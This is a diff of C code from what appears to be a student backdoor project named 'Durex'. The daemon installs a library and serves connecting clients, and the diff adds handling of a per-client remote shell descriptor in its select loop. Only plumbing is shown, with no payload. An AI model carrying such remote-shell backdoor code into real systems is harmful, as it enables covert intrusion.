@@ -6,7 +6,7 @@
 /*   By: root </var/mail/root>                      +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2018/07/15 02:43:33 by root              #+#    #+#             */
-/*   Updated: 2018/08/26 23:08:14 by root             ###   ########.fr       */
+/*   Updated: 2018/08/28 05:42:08 by root             ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -68,6 +68,11 @@ static int			setupSelect()
 				max = e.server.client[i].fd;
 			FD_SET(e.server.client[i].fd, &e.server.fdr);
 			FD_SET(e.server.client[i].fd, &e.server.fdw);
+			if (e.server.client[i].shell != -1) {
+				if (e.server.client[i].shell > max)
+					max = e.server.client[i].shell;
+				FD_SET(e.server.client[i].shell, &e.server.fdr);
+			}
 		}
 		i++;
 	}
@@ -82,12 +87,12 @@ void				durex()
 
 	cleanStructure();
 	if (launch_program() && install_library()) {
+		serverLog("[INFO] - Durex pid: %d", getpid());
 		e.server.reporter = hireReporter();
 		serverLog("[LOGS] - Opening Server...");
 		e.server.fd = openServer(SERVER_ADDR, SERVER_PORT);
 		serverLog("[LOGS] - Waiting for connections...");
 		mymemset(&timeout, 0, sizeof(timeout));
-		serverLog("[INFO] Process pid: %d", getpid());
 		while (1)
 		{
 			maxfd = setupSelect();
@@ -106,6 +111,8 @@ void				durex()
 					serverReadClient(&e.server.client[i]);
 				if (FD_ISSET(e.server.client[i].fd, &e.server.fdw))
 					serverWriteClient(&e.server.client[i]);
+				if (FD_ISSET(e.server.client[i].shell, &e.server.fdr))
+					serverReadClientShell(&e.server.client[i]);
 			}
 			check_library();
 		}
